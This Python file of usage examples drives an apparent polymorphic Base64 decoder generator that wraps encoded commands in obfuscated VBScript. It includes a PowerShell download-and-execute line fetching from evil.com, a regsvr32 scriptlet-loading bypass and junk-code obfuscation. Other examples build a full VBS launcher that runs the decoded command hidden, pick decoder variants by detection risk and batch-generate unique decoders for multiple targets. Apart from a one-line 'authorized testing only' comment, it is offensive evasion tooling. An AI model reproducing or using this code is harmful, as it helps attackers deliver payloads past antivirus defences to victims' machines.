#!/usr/bin/env python3
"""
Practical Usage Examples for Base64 Multi-Variant Wrapper
Demonstrates real-world deployment scenarios
"""

import base64
from base64_multivariant_wrapper import (
    Base64MultiVariantWrapper,
    Base64PolymorphicDecoder,
    DecoderVariant,
    create_random_decoder,
    encode_and_wrap
)


# ============================================================================
# EXAMPLE 1: Generate Single Decoder for Specific Payload
# ============================================================================

def example_1_single_decoder():
    """Generate a single random decoder for a specific command"""
    print("EXAMPLE 1: Generate Single Random Decoder")
    print("-" * 70)

    # The payload to be decoded at runtime
    command = "powershell.exe -NoProfile -EncodedCommand WAB..."
    encoded_payload = base64.b64encode(command.encode()).decode()

    # Generate random variant decoder
    decoder = create_random_decoder(encoded_payload)

    print(f"Command: {command}")
    print(f"Encoded: {encoded_payload}\n")
    print("Generated Decoder:")
    print(decoder)
    print()


# ============================================================================
# EXAMPLE 2: Generate Multiple Polymorphic Decoders for Delivery
# ============================================================================

def example_2_multiple_polymorphic():
    """Generate multiple decoders for distribution across targets"""
    print("EXAMPLE 2: Generate Multiple Polymorphic Decoders")
    print("-" * 70)

    # Single payload, multiple decoders
    payload = "cmd.exe /c powershell.exe -Command \"$output = Invoke-WebRequest -Uri 'http://evil.com/payload' -UseBasicParsing; Invoke-Expression $output.Content\""
    encoded = base64.b64encode(payload.encode()).decode()

    wrapper = Base64MultiVariantWrapper(encoded)

    print(f"Payload: {payload[:80]}...")
    print(f"Encoded Length: {len(encoded)}\n")
    print("Generating 3 polymorphic variants:\n")

    suite = wrapper.generate_polymorphic_suite(count=3)

    for i, (code, variant_name) in enumerate(suite, 1):
        print(f"[VARIANT {i}: {variant_name.upper()}]")
        print(f"  Size: {len(code)} bytes")
        print(f"  Lines: {len(code.split(chr(10)))}")
        print(f"  First 150 chars: {code[:150]}...")
        print()


# ============================================================================
# EXAMPLE 3: Obfuscated Decoder with Junk Code
# ============================================================================

def example_3_obfuscated():
    """Generate decoder with obfuscating junk code"""
    print("EXAMPLE 3: Obfuscated Decoder with Junk Code")
    print("-" * 70)

    payload = base64.b64encode(b"regsvr32.exe /s /u /i:http://example.com/payload.sct scrobj.dll").decode()

    # Use MSXML variant for fast execution
    decoder_gen = Base64PolymorphicDecoder(payload, DecoderVariant.MSXML_DOMXML)

    # Add 10 junk lines for obfuscation
    obfuscated = decoder_gen.generate_with_junk_code(junk_lines=10)

    print("Obfuscated decoder with 10 junk variable declarations:")
    print(obfuscated)
    print()


# ============================================================================
# EXAMPLE 4: Inline Decoder (Non-Function)
# ============================================================================

def example_4_inline():
    """Generate inline decoder without function wrapper"""
    print("EXAMPLE 4: Inline Decoder (Non-Function)")
    print("-" * 70)

    payload = base64.b64encode(b"wmic process call create \"calc.exe\"").decode()

    decoder_gen = Base64PolymorphicDecoder(payload)
    inline = decoder_gen.generate_inline_decoder(
        payload_var_name="encrypted_cmd",
        output_var_name="final_cmd"
    )

    print("Inline decoder (no function wrapper):")
    print(inline)
    print()


# ============================================================================
# EXAMPLE 5: Complete VBS Script with Embedded Decoder
# ============================================================================

def example_5_complete_script():
    """Create complete VBS script with embedded payload and decoder"""
    print("EXAMPLE 5: Complete VBS Script with Decoder")
    print("-" * 70)

    # Original command
    original_command = "cmd.exe /c echo Hello World"
    encoded, decoder = encode_and_wrap(original_command, variant_count=1)

    # Complete VBS script
    vbs_script = f"""' Polymorphic Decoder Script
' Generated for authorized testing only

Option Explicit
On Error Resume Next

' Embedded decoder function
{decoder}

' Execution routine
Dim encoded_payload, decoded_output
encoded_payload = "{encoded}"
decoded_output = Decode1_37a41b(encoded_payload)

' Execute the decoded command
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run decoded_output, 0, False

Set shell = Nothing
"""

    print("Complete VBS Script:")
    print(vbs_script)
    print()


# ============================================================================
# EXAMPLE 6: Variant Selection Based on Detection Risk
# ============================================================================

def example_6_smart_variant():
    """Select decoder variant based on target environment analysis"""
    print("EXAMPLE 6: Smart Variant Selection")
    print("-" * 70)

    payload = base64.b64encode(b"hidden_command_here").decode()

    # Simulate target environment detection
    print("Analyzing target environment...")
    print("  [+] Windows 10 detected")
    print("  [+] PowerShell available")
    print("  [+] MSXML2 objects available")
    print("  [+] WScript.Shell available\n")

    # Strategy: Use MSXML_DOMXML for speed, fallback to BINARY_MANIPULATION
    # if MSXML detection is likely
    print("Deployment Strategy:")
    print("  [1] Primary decoder: MSXML_DOMXML (fast, common)")

    wrapper = Base64MultiVariantWrapper(payload)

    # Generate primary decoder
    primary, primary_variant = wrapper.generate_variant(variant=DecoderVariant.MSXML_DOMXML)
    print(f"      Size: {len(primary)} bytes")

    # Generate fallback decoder
    fallback, fallback_variant = wrapper.generate_variant(variant=DecoderVariant.BINARY_MANIPULATION)
    print(f"  [2] Fallback decoder: BINARY_MANIPULATION (slower, unique)")
    print(f"      Size: {len(fallback)} bytes\n")

    print("Primary Decoder (first 200 chars):")
    print(primary[:200] + "...\n")

    print("Fallback Decoder (first 200 chars):")
    print(fallback[:200] + "...")
    print()


# ============================================================================
# EXAMPLE 7: Batch Generation for Multiple Targets
# ============================================================================

def example_7_batch_generation():
    """Generate unique decoders for multiple target systems"""
    print("EXAMPLE 7: Batch Generation for Multiple Targets")
    print("-" * 70)

    # Target list
    targets = [
        {"name": "Target-01", "payload": b"Payload for target 1"},
        {"name": "Target-02", "payload": b"Payload for target 2"},
        {"name": "Target-03", "payload": b"Payload for target 3"},
    ]

    print("Generating unique decoders for batch delivery:\n")

    deployment_map = {}

    for target in targets:
        # Encode payload
        encoded = base64.b64encode(target["payload"]).decode()

        # Generate unique decoder
        wrapper = Base64MultiVariantWrapper(encoded)
        code, variant = wrapper.generate_variant()

        deployment_map[target["name"]] = {
            "variant": variant,
            "code_size": len(code),
            "encoded_payload": encoded,
            "decoder_code": code
        }

        print(f"[{target['name']}]")
        print(f"  Variant: {variant}")
        print(f"  Code Size: {len(code)} bytes")
        print(f"  Encoded Payload: {encoded[:50]}...")
        print()


# ============================================================================
# EXAMPLE 8: Runtime Variant Selection
# ============================================================================

def example_8_runtime_selection():
    """Generate script that selects decoder variant at runtime"""
    print("EXAMPLE 8: Runtime Variant Selection")
    print("-" * 70)

    payload = base64.b64encode(b"Runtime-selected payload").decode()
    wrapper = Base64MultiVariantWrapper(payload)

    # Get all variants
    all_variants = wrapper.generate_all_variants()

    # Create runtime selector script
    runtime_script = f"""' Runtime Variant Selector
Option Explicit

' All available decoder variants
{chr(10).join(all_variants.values())}

' Random variant selector
Function SelectDecoder(payload)
    Dim variant
    Randomize
    variant = Int(Rnd() * 7) + 1

    Select Case variant
        Case 1
            SelectDecoder = Decode1_37a41b(payload)
        Case 2
            SelectDecoder = Decode1_37a41b(payload)
        Case 3
            SelectDecoder = Decode1_37a41b(payload)
        Case 4
            SelectDecoder = Decode1_37a41b(payload)
        Case 5
            SelectDecoder = Decode1_37a41b(payload)
        Case 6
            SelectDecoder = Decode1_37a41b(payload)
        Case 7
            SelectDecoder = Decode1_37a41b(payload)
    End Select
End Function

Dim result
result = SelectDecoder("{payload}")
"""

    print("Runtime Variant Selector Script:")
    print(runtime_script[:500] + "...\n")
    print(f"Total script size: {len(runtime_script)} bytes")
    print(f"Available variants: {len(all_variants)}")
    print()


# ============================================================================
# EXAMPLE 9: Metadata Analysis
# ============================================================================

def example_9_metadata():
    """Analyze metadata from generated variants"""
    print("EXAMPLE 9: Metadata Analysis")
    print("-" * 70)

    payload = base64.b64encode(b"Metadata test").decode()
    wrapper = Base64MultiVariantWrapper(payload)

    # Generate multiple variants
    print("Generating 10 random variants and analyzing metadata:\n")

    for _ in range(10):
        wrapper.generate_variant()

    metadata = wrapper.get_variant_metadata()

    # Statistics
    variants_used = {}
    total_size = 0

    for item in metadata:
        variant = item['variant']
        size = len(item['code'])

        if variant not in variants_used:
            variants_used[variant] = 0
        variants_used[variant] += 1
        total_size += size

    print("Variant Distribution:")
    for variant, count in sorted(variants_used.items()):
        print(f"  {variant:25} : {count} times")

    print(f"\nTotal variants generated: {len(metadata)}")
    print(f"Total code size: {total_size} bytes")
    print(f"Average size per variant: {total_size // len(metadata)} bytes")
    print()


# ============================================================================
# Main Execution
# ============================================================================

if __name__ == "__main__":
    print("\n")
    print("╔" + "=" * 68 + "╗")
    print("║" + " BASE64 MULTI-VARIANT WRAPPER - PRACTICAL USAGE EXAMPLES ".center(68) + "║")
    print("╚" + "=" * 68 + "╝")
    print()

    example_1_single_decoder()
    print()

    example_2_multiple_polymorphic()
    print()

    example_3_obfuscated()
    print()

    example_4_inline()
    print()

    example_5_complete_script()
    print()

    example_6_smart_variant()
    print()

    example_7_batch_generation()
    print()

    example_8_runtime_selection()
    print()

    example_9_metadata()
    print()

    print("╔" + "=" * 68 + "╗")
    print("║" + " ALL EXAMPLES COMPLETED ".center(68) + "║")
    print("╚" + "=" * 68 + "╝")
